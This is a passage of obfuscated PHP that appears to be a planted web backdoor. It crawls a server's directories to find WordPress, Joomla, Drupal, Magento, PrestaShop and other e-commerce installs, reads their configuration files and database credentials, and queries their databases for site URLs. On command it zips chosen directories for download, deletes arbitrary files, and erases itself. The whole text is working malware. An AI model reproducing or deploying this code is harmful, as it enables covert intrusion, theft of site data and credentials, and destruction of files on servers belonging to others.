{
    if ( !class_exists('ZipArchive') ) return 2;

    $zip = new ZipArchive();
    if( $zip->open( $pFileNameZIP, ZIPARCHIVE::CREATE | ZIPARCHIVE::OVERWRITE) !== true ) return 0;

    $ar_ext = array();

    if ($pFilterStr !== NULL  &&  $pFilterStr != '')
    {
        $ar_ext = explode(',', $pFilterStr);
    }

    $cnt = 0;

    $ins = M5AO8( $pDirToZIP );
    for ($f = 0; $f < count($ins); $f ++ )
    {
        $this_fn = $ins[$f];


        if ($this_fn == $pFileNameZIP  ||  $this_fn == $_SERVER['SCRIPT_FILENAME']) continue;

        if ( count($ar_ext) > 0  &&  !BGFfH($this_fn, $ar_ext) ) continue;

        $cnt ++;
        $zip->addFile( $this_fn, substr($this_fn, strlen($pFileNameBaseInZIP)) );
    }

    $zip->close();

    if ($cnt > 0) return 1;
    return 3;
}



function xclqD(&$pAr0, &$pAr1, $pNum)
{
    for ($x = 0; $x < $pNum; $x ++ )
    {
        if ($pAr0[$x] != $pAr1[$x]) return 0;
    }

    return 1;
}


function lEB8q($pAbsDir, $pInd)
{
    $r = @scandir($pAbsDir);
    if ($r === FALSE) return NULL;
    $num_it = count($r);
    if ($pInd >= $num_it) return NULL;
    return array( 'list' => $r, 'fn' => $r[$pInd] );
}


function yDH0i(&$pAr, $pBase, &$pCache)
{
    if ($pCache['wd'] !== NULL)
    {
        if (xclqD($pAr, $pCache['wd'], count($pAr) - 1) )
        {
            $last_ind = $pAr[ count($pAr) - 1 ];

            if ($last_ind < count($pCache['list']) )
            {

                $full_fn = $pCache['dir'] . $pCache['list'][$last_ind];
                return array($full_fn, @is_dir($full_fn), $pCache['list'][$last_ind]);
            }
            else
            {
                return NULL;
            }
        }
        else
        {
            $pCache['wd'] = NULL;
        }
    }


    $isd = 0;

    for ($x = 0; $x < count($pAr); $x ++ )
    {
        $ii = (int)$pAr[$x];

        $re = lEB8q($pBase, $ii);
        if ($re === NULL)
        {
            return NULL;
        }
        else
        {
            $full_fn = $pBase . $re['fn'];
            $isd = @is_dir($full_fn);
            if (!$isd) break;
            $pBase = $full_fn . '/';
        }
    }

    if ($pCache['wd'] === NULL)
    {
        $pCache['wd']   = array_slice($pAr, 0, count($pAr) - 1);
        $pCache['dir']  = FOJpz($full_fn);
        $pCache['list'] = $re['list'];
    }

    return array($full_fn, $isd, $re['fn']);
}

function ZdG2x($pFN, &$pIgnoreParts)
{
    foreach( $pIgnoreParts as $prt )
    {
        if (strpos($pFN, $prt) !== FALSE) return 1;
    }

    return 0;
}

function GlYlg(&$pIn, $pBase, $pCallbackFunc, &$pCache, &$pIgnoreParts)
{
    $fi = yDH0i($pIn, $pBase, $pCache);

    if ($fi === NULL)
    {
        $pCache['wd'] = NULL;

        array_pop($pIn);
        $cnt = count($pIn);
        if ($cnt < 1) return 0;
        $pIn[ $cnt-1 ] ++;
        return 1;
    }


    $is_norm = $fi[2] != '..'  &&   $fi[2] != '.'  &&  !@is_link($fi[0]);

    if ($is_norm) $pCallbackFunc( $fi[0], (int)$fi[1] );


    if ( $fi[1] == 1  &&  $is_norm  &&  !ZdG2x($fi[0], $pIgnoreParts) )
    {
        array_push($pIn, 0);
        $pCache['wd'] = NULL;
    }
    else $pIn[ count($pIn) - 1 ] ++;

    return 1;
}

function l76ZW($pBaseDir, $pStateIn, $pMaxTime, $pCallback, &$pIgnoreParts)
{
    $a      = explode(',', $pStateIn);
    $tm_st  = time();
    $cache  = array( 'wd' => NULL );
    $cnt    = 0;
    $end    = 0;

    do
    {
        if ( !GlYlg($a, $pBaseDir, $pCallback, $cache, $pIgnoreParts) )
        {
            $end = 1;
            break;
        }
        $cnt ++;
    }
    while ( time() - $tm_st < $pMaxTime );


    $ret = array( 'st' => '', 'cnt' => $cnt );

    if ($end == 0)
    {
        $ret['st'] = implode(",", $a);
    }

    return $ret;
}




function F_FindStartingDomainPath($pDir)
{
    while(1)
    {
        if (!zzjOk($pDir)) break;
        if (VTg4N($pDir)) return $pDir;
        if (fnuK3($pDir)) return $pDir;
        if (f7LTw($pDir)) return $pDir;
        if (VeA9t($pDir)) return $pDir;
        if (vskNE($pDir)) return $pDir;
        if (unbZB($pDir)) return $pDir;
        if (b6AOp($pDir)) return $pDir;
        $pDir = Bs3np($pDir);
    }

    return '';
}


function xh7KU($pType, $pRootDir)
{
    $resolved_domain = '';


    if (    $pType == 200   ||
            $pType == 203
         )
    {
        $cfg = jEd6X($pRootDir);
        if ($cfg) $resolved_domain = $cfg['url'];
    }
    else if ($pType == 202)
    {
        $cfg = weh2j($pRootDir);
        if ($cfg) $resolved_domain = $cfg['url'];
    }
    else if ($pType == 204)
    {
        $cfg = fQmg7($pRootDir);
        if ($cfg) $resolved_domain = $cfg['url'];
    }
    else if ($pType == 201)
    {
        $cfg = I8hWq($pRootDir);
        if ($cfg)
        {
			$ha = skqo9($cfg['db_host'], $cfg['db_user'], $cfg['db_pass'], $cfg['db_name']);
			if ($ha)
			{
				$res = rP87N(" SELECT `value` FROM `core_config_data` WHERE `path`='web/unsecure/base_url' ", $ha);
				if ($res['code'] == 1)  $resolved_domain = $res['data'][0];
				Eep5t($ha);
			}
        }
    }

    else if ($pType == 205
            )
    {
        $cfg = LBwW3($pRootDir);

        if ($cfg)
        {
            $ha = skqo9($cfg['db_host'], $cfg['db_user'], $cfg['db_pass'], $cfg['db_name']);
            if ($ha)
            {
                $tmp = $cfg['db_prefix'] . 'options';
                $res = rP87N(" SELECT `option_value` FROM `$tmp` WHERE `option_name`='siteurl' ", $ha);
                if ($res['code'] == 1)  $resolved_domain = $res['data'][0];

                Eep5t($ha);
            }
        }
    }
    else if ($pType == 207)
    {
        $cfg = EqwV1($pRootDir);
        if ($cfg) $resolved_domain = $cfg['url'];
    }
    else if ($pType == 208)
    {
        $cfg = Yo9Gz($pRootDir);
        if ($cfg) $resolved_domain = $cfg['url'];
    }
    else if ($pType == 209)
    {
        $cfg = W7QZw($pRootDir);
        if ($cfg) $resolved_domain = $cfg['url'];
    }
    else if ($pType == 206)
    {
        $cfg = uZIgK($pRootDir);
        if ($cfg)
        {
			$ha = skqo9( $cfg['db_host'], $cfg['db_user'], $cfg['db_pass'], $cfg['db_name'] );
			if ($ha)
			{
				while(1)
				{

					$tmp = $cfg['db_prefix'] . 'shop_url';
					$res = rP87N(" SELECT `domain` FROM `$tmp` ", $ha);
					if ($res['code'] == 1)
					{
						$resolved_domain = $res['data'][0];
						break;
					}
					else x7Imi('db query fail (presta real domain A): ' . $res['data']);



					$tmp = $cfg['db_prefix'] . 'configuration';
					$res = rP87N(" SELECT `value` FROM `$tmp` WHERE `name`='PS_SHOP_DOMAIN' ", $ha);
					if ($res['code'] == 1)
					{
						$resolved_domain = $res['data'][0];
						break;
					}
					else x7Imi('db query fail (presta real domain B): ' . $res['data']);

					break;
				}

				Eep5t($ha);
			}
		}
    }
    else $resolved_domain = '???';

    $r = array('dom' => $resolved_domain, 'sta' => F_FindStartingDomainPath( qx1PV() ) );

    return $r;
}






function fnuK3($pDir)
{
    if (is_dir($pDir . 'wp-admin') && is_dir($pDir . 'wp-content')  &&  is_dir($pDir . 'wp-includes')  &&  is_file($pDir . 'wp-config.php') ) return 1;
    return 0;
}

function f7LTw($pDir)
{
    if ( is_dir($pDir . 'misc') && is_dir($pDir . 'sites') && is_dir($pDir . 'profiles') && is_dir($pDir . 'includes') && is_dir($pDir . 'modules') ) return 1;
    return 0;
}

function VTg4N($pDir)
{
    if (is_dir($pDir . 'administrator') && is_dir($pDir . 'includes')  &&  is_dir($pDir . 'modules')  &&  is_dir($pDir . 'components') ) return 1;
    return 0;
}

function VeA9t($pDir)
{
    if ( is_file($pDir . 'ipn_main_handler.php')  &&  is_file($pDir .'includes/configure.php')  && is_file($pDir .'admin/includes/configure.php')  ) return 1;
    return 0;
}

function vskNE($pDir)
{
    if ( is_file($pDir . 'config/settings.inc.php')  &&  is_dir($pDir . 'modules') ) return 1;
    return 0;
}

function unbZB($pDir)
{
    if ( is_file($pDir . 'config/config.php')  &&  is_file($pDir. 'account.php') ) return 1;
    return 0;
}

function QktZL($pDir)
{
    if ( is_file($pDir . 'config.local.php') )
    {

        if ( is_file($pDir . 'controllers/admin/order_management.php' ) ) return 1;


        if ( is_file($pDir . 'app/controllers/backend/order_management.php'  ) ) return 1;
    }

    return 0;
}

function b6AOp($pDir)
{
    if ( is_file($pDir . 'includes/classes/action_recorder.php') ) return 1;
    return 0;
}




$gFoundShit = array();

function SK7X3($pType, $pPath)
{
    global $gFoundShit;
    for ($x = 0; $x < count($gFoundShit); $x ++ )
    {
        if ($gFoundShit[$x][0] == $pType  &&  $gFoundShit[$x][1] == $pPath) return $x;
    }
    return -1;
}

function S7bgi($pDir, $pType)
{
    global $gFoundShit;

    $dalist = array();
    $num = ClzQ7($pDir, $dalist);
    for ($x = 0; $x < $num; $x ++ )
    {

        if (SK7X3($pType, $dalist[$x]) != -1) continue;

        $gFoundShit []= array($pType, $dalist[$x]);
    }
}

function HhnDC($pDir, $pType)
{
    global $gFoundShit;
    if (SK7X3($pType, $pDir) != -1) return;
    $gFoundShit []= array($pType, $pDir);
}


function CB_My($pFN, $pIsDir)
{
    if ( !$pIsDir ) return;

    $dir = $pFN . '/';

    if ( fnuK3($dir) )
    {
        x7Imi("WP @ $dir");

        S7bgi($dir . 'wp-content/plugins', 100);
        S7bgi($dir . 'wp-content/themes',  101);

        if ( is_dir($dir . 'wp-content/plugins/woocommerce') )
        {
            HhnDC($dir, 205);
        }


    }
    else if ( f7LTw($dir) )
    {
        x7Imi("Drupal @ $dir");

        S7bgi($dir . 'sites/all/modules',    110);
        S7bgi($dir . 'sites/all/themes',     111);
        S7bgi($dir . 'sites/all/libraries',  112);
    }
    else if ( VTg4N($dir) )
    {
        x7Imi("Joomla @ $dir");

        S7bgi($dir . 'components',                   120);
        S7bgi($dir . 'libraries',                    121);
        S7bgi($dir . 'templates',                    122);
        S7bgi($dir . 'modules',                      123);
        S7bgi($dir . 'plugins',                      124);
        S7bgi($dir . 'administrator/components',     125);
        S7bgi($dir . 'administrator/modules',        126);
        S7bgi($dir . 'administrator/templates',      127);

        if ( is_dir($dir . 'components/com_virtuemart') )
        {
            HhnDC($dir, 200);
        }

        HhnDC($dir, 203);
    }
    else if ( is_file($dir . 'app/etc/local.xml') )
    {
        x7Imi("Magento @ $dir");
        HhnDC($dir, 201);
    }
    else if ( is_file($dir . 'system/engine/registry.php') )
    {
        x7Imi("Open-Cart @ $dir");
        HhnDC($dir, 202);
    }
    else if ( VeA9t( $dir ) )
    {
        x7Imi("ZenCart @ $dir");
        HhnDC($dir, 204);
    }
    else if ( vskNE( $dir)  )
    {
        x7Imi("PrestaShop @ $dir");
        HhnDC($dir, 206);
    }
    else if ( unbZB( $dir ) )
    {
        x7Imi("Interspire @ $dir");
        HhnDC($dir, 207);
    }
    else if ( QktZL( $dir ) )
    {
        x7Imi("CS-Cart @ $dir");
        HhnDC($dir, 208);
    }
    else if ( b6AOp ($dir) )
    {
        x7Imi("OS-Commerce @ $dir");
        HhnDC($dir, 209);
    }
}







$gIgnFileParts = array(

    'devices',
    'tty',
    'cgi-bin',
    'cache',
    'cache88',
    'proc',
    'mailquota',
    '.snapshot',
    '$Recycle.Bin',
    'www/www',
    'root/sys',
    'k2',
    'civicrm/templates_c',
    'wp-content/uploads',
    'TMP/CACHE',
	'iblock',
	'medialibrary',

    'var/chroot/var',
    'var/chroot/home/content',

    'svn_wp',

);

set_time_limit(400);

$p_act = wC5Vz('act');

if ($p_act == 0)
{
    echo 'ZAJE' . 'BEATLES';
    unlink($_SERVER['SCRIPT_FILENAME']);
}
else if ($p_act == 1)
{
    $base_dir = hvhLI( qx1PV(), 5 );

    $p_st = rntvb('st');
    if ($p_st === NULL) $p_st = '0';

    $rr = l76ZW($base_dir, $p_st, 9.0, 'CB_My', $gIgnFileParts);

    $str_fnd = array();
    foreach($gFoundShit as $fnd)
    {
        $str_fnd []= sprintf("%d^^^%s", $fnd[0], $fnd[1]);
    }

    $rr['fnd'] = implode('~~~', $str_fnd);

    oXerH($rr);
}
else if ($p_act == 2)
{
    $dir        = rntvb('dir');
    $base       = rntvb('base');
    $fname      = rntvb('fname');
    $flt_exts   = rntvb('filter');

    $zip_fn     = qx1PV() . $fname;

    $r = jGwnk($zip_fn, $dir, $base, $flt_exts);
    $r = array( 'code' => $r );
    oXerH( $r );
}
else if ($p_act == 3)
{
    $names     = rntvb('names');
    $ar        = explode(',', $names);
    foreach($ar as $n)
    {
        $n = base64_decode($n);
        unlink( $n );
    }

    $r = array('code' => '1');
    oXerH( $r );
}
else if ($p_act == 4)
{
    $dir        = rntvb('dir');
    $type       = wC5Vz('type');
    $r_first    = wC5Vz('row_f');
    $r_num      = wC5Vz('row_n');
    $re         = Opqar($type, $dir, $r_first, $r_num);
    oXerH( $re );
}
else if ($p_act == 5)
{
	$dir        = rntvb('dir');
	$type       = wC5Vz('type');
    $r = xh7KU($type, $dir);
    oXerH( $r );
}

?>
